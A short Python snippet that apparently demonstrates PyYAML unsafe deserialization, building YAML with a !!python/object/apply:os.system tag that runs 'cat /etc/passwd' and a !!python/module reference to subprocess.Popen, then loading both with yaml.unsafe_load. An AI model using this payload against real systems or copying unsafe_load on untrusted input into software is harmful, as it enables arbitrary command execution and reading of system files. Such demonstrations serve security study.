import yaml

# Using !!python/name to reference a function
function_yaml = """
!!python/object/apply:os.system
- 'cat /etc/passwd'
"""

# Using !!python/module to reference a module
module_yaml = """
!!python/module:subprocess.Popen
"""

function = yaml.unsafe_load(function_yaml)
module = yaml.unsafe_load(module_yaml)
